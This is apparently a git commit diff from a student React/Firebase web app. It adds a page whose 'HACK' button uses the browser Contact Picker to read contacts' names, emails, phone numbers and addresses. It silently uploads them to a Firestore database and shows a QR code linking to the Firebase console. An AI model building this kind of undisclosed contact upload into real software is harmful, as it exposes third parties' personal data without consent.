db7f5ae03322dabff18d666431663a32f5ac3747
Anguinea Matheux <anguimatheux@gmail.com>
2022-11-24 10:31:29 +0100

    add qr and hack contacts

--- src/App.jsx
+++ src/App.jsx
@@ -3,6 +3,7 @@ import Login from "./pages/Login/Login";
 import Register from "./pages/Register/Register";
 import { UserProvider } from "./context/UserContext";
 import {FirebaseProvider} from "./context/FirebaseContext";
+import Home from "./pages/Home/Home";
 export default function App() {
   return(
     <UserProvider>
@@ -11,6 +12,7 @@ export default function App() {
           <Routes>
             <Route index path="/" element={<Login />} />
             <Route index path="/register" element={<Register />} />
+            <Route index path="/home" element={<Home />} />
           </Routes>
         </BrowserRouter>
       </FirebaseProvider>
--- src/pages/Home/Home.jsx
+++ src/pages/Home/Home.jsx
@@ -1,5 +1,55 @@
+import { useContext, useState } from "react";
+import { writeBatch, collection, doc } from "firebase/firestore"; 
+import { FirebaseContext } from "../../context/FirebaseContext";
+import QRCode from "react-qr-code";
+
 export default function Home() {
+  const [contacts, setContacts] = useState([])
+  const [error, setError] = useState(null);
+  const {db} = useContext(FirebaseContext)
+
+  const handleClick = async () =>{
+      const props = ['name', 'email', 'tel', 'address'];
+      const opts = {multiple: true};
+      
+      try {
+          const contacts = await navigator.contacts.select(props, opts);
+          setContacts(contacts);
+          const batch = writeBatch(db);
+          contacts.map(async (item)=> {
+              batch.set(doc(collection(db, "contacts")),item)
+          });
+
+          batch.commit()
+      } catch (e) {
+          setError(e)
+      }
+      
+  }
+
   return (
-    <div>Home</div>
+    <div>
+        {
+            error && <p className="error">{error.message}</p>
+        }
+        <button onClick={handleClick}>HACK</button>
+        {
+            contacts.map((contact)=>{
+                return (
+                    <div className="contact" key={contact.email}>
+                        <p className="contact__text">{contact.name}</p>
+                        <p className="contact__text">{contact.email}</p>
+                        <p className="contact__text">{contact.tel}</p>
+                        <p className="contact__text">{contact.address}</p>
+                    </div>
+                )
+            })
+        }
+        <QRCode
+            style={{ height: "auto", maxWidth: "100%", width: "30%" }}
+            value="https://console.firebase.google.com/u/0/project/pwaapp-8feaf/overview"
+            viewBox={`0 0 256 256`}
+        />
+    </div>
   )
 }
